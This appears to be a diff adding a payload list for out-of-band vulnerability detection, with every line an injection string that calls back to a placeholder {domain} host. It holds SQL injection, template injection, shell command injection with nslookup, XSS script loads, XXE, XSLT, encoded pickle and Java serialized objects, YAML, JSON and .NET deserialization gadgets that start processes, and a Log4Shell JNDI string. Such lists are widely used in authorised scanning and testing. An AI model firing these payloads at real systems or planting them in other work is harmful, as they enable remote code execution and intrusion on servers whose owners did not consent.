@@ -1,0 +1,18 @@
+';EXEC master..xp_dirtree '\\{domain}\a'--/*'OR LOAD_FILE('\\\\{domain}\\a')OR'*/"OR(SELECT dblink_send_query('host={domain}','SELECT 1'))--
+{{__import__('urllib.request').request.urlopen('http://{domain}/ssti')}}${T(java.net.URL).new('http://{domain}/ssti').openStream()}<%= require('net/http');Net::HTTP.get(URI('http://{domain}/ssti')) %>
+;nslookup {domain} #'|nslookup {domain}|"$(nslookup {domain})`nslookup {domain}`
+__import__('urllib.request').request.urlopen('http://{domain}/pyeval')
+'"><script src=//{domain}/x.js></script><img src=//{domain}/x onerror=alert(1337)><!--
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/xxe">]><foo>&xxe;</foo>
+<xsl:value-of select="document('http://{domain}/xslt')"/>
+new URL('http://{domain}/groovy').text
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGUiKScKdFIu
+!!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen('http://{domain}/yaml')"]
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["__import__('urllib.request').request.urlopen('http://{domain}/jsonpickle')"]}]}
+{"rce":"_$$ND_FUNC$$_function(){require('http').get('http://{domain}/nodeser')}()"}
+{"@type":"java.net.InetAddress","val":"{domain}"}
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.net.URL"><string>http://{domain}/xmldecoder</string><void method="openStream"/></object></java>
+C_hessianRldap://{domain}/a
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"nslookup","Arguments":"{domain}"}}}
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHA/QAAAAAAADHcIAAAAEAAAAAFzcgAMamF2YS5uZXQuVVJMliU3Nhr85HIDAAdJAAhoYXNoQ29kZUkABHBvcnRMAAlhdXRob3JpdHl0ABJMamF2YS9sYW5nL1N0cmluZztMAARmaWxldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEaG9zdHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHByb3RvY29sdAASTGphdmEvbGFuZy9TdHJpbmc7TAADcmVmdAASTGphdmEvbGFuZy9TdHJpbmc7cP//////////dAAIe2RvbWFpbn10AAcvdXJsZG5zdAAIe2RvbWFpbn10AARodHRwcHh0ABZodHRwOi8ve2RvbWFpbn0vdXJsZG5zeA==
+${jndi:ldap://{domain}/a}
